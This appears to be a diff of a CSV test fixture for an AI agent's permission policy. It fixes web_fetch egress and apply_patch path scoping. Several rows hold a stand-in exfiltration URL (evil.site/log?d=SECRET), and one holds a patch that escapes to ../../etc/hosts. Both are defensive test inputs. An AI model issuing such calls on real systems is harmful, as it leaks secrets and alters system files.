@@ -23,5 +23,10 @@ connector-write,interactive,gmail_send,{},external,,,,,,,ask,connector write ask
 connector-always-ignored,interactive,gmail_send,{},external,,gmail_send,,,,,ask,session tool grant deliberately ignored for connectors
 standing-match,interactive,send_message,"{""target"": ""slack:T1/C1"", ""text"": ""hi""}",external,,,,send_message slack:T1/C1,,,allow,standing rule matches the exact target
 standing-mismatch,interactive,send_message,"{""target"": ""slack:T1/C2"", ""text"": ""hi""}",external,,,,send_message slack:T1/C1,,,ask,standing rule does not cover a different target
-webfetch-interactive,interactive,web_fetch,"{""url"": ""https://evil.site/log?d=SECRET""}",,,,,,,,allow,BASELINE-WRONG web_fetch classed as read so never gates
-webfetch-plan,plan,web_fetch,"{""url"": ""https://evil.site/log?d=SECRET""}",,,,,,,,allow,BASELINE-WRONG web_fetch runs even in read-only plan mode
+webfetch-interactive,interactive,web_fetch,"{""url"": ""https://evil.site/log?d=SECRET""}",,,,,,,,ask,FIXED-PR1 web_fetch is egress so now asks in interactive
+webfetch-plan,plan,web_fetch,"{""url"": ""https://evil.site/log?d=SECRET""}",,,,,,,,deny,FIXED-PR1 egress is not a read so plan mode blocks it
+webfetch-auto,auto,web_fetch,"{""url"": ""https://evil.site/log?d=SECRET""}",,,,,,,,allow,auto allows egress
+webfetch-allowed-domain,interactive,web_fetch,"{""url"": ""https://docs.python.org/3/x""}",,,,,,,python.org,allow,egress to a config-allowed domain (subdomain match)
+webfetch-session-domain,interactive,web_fetch,"{""url"": ""https://api.github.com/x""}",,,,,,,,ask,egress to an unlisted domain still asks
+patch-escape,auto,apply_patch,"{""patch"": ""*** Begin Patch\n*** Update File: ../../etc/hosts\n@@\n-a\n+b\n*** End Patch""}",,,,,,,,deny,FIXED-PR1 apply_patch path extracted from blob and scoped even in auto
+patch-inroot,auto,apply_patch,"{""patch"": ""*** Begin Patch\n*** Update File: src/app.py\n@@\n-a\n+b\n*** End Patch""}",,,,,,,,allow,apply_patch to an in-root path allowed in auto
